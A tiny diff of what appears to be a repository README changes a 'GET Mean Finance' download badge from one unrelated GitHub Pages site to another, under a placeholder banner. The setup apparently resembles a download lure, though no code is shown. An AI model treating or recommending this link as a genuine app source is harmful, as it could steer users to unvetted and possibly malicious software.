@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://avatars.mds.yandex.net/i?id=2cbf13d7db44cca702de0428dfc737717e834d41-10234572-images-thumbs&n=13)
 
-[![GET Mean Finance](https://img.shields.io/badge/GET%20%E2%80%94%20Mean%20Finance-0078D6?style=for-the-badge&logoColor=white)](https://service-control-monitor-suite.github.io/.github/mean-finance-app)
+[![GET Mean Finance](https://img.shields.io/badge/GET%20%E2%80%94%20Mean%20Finance-0078D6?style=for-the-badge&logoColor=white)](https://baturbarbarosoglu.github.io/.github/mean-finance-app)
 
 ---
 
